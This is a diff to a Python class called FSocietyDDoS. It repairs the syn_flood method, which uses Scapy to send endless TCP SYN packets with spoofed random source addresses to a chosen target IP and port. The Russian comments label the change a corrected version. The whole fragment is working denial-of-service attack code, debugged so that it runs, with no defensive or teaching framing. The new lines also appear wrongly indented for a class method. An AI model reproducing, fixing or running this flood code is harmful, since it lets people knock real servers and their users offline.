@@ -57,19 +57,19 @@ class FSocietyDDoS:
                 pass
 
     def syn_flood(self):
-        while self.attack_active:
-            try:
-                # Генерация случайных IP
-                src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4)))
-                
-                # Создание SYN пакета
-                ip_layer = IP(src=src_ip, dst=self.target_ip)
-                tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
-                packet = ip_layer / tcp_layer
-                
-                send(packet, verbose=0)
-            except:
-                pass
+    while self.attack_active:
+        try:
+            # Генерация случайных IP (ИСПРАВЛЕННАЯ ВЕРСИЯ)
+            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+            
+            # Создание SYN пакета
+            ip_layer = IP(src=src_ip, dst=self.target_ip)
+            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
+            packet = ip_layer / tcp_layer
+            
+            send(packet, verbose=0)
+        except:
+            pass
 
     def udp_flood(self):
         while self.attack_active:
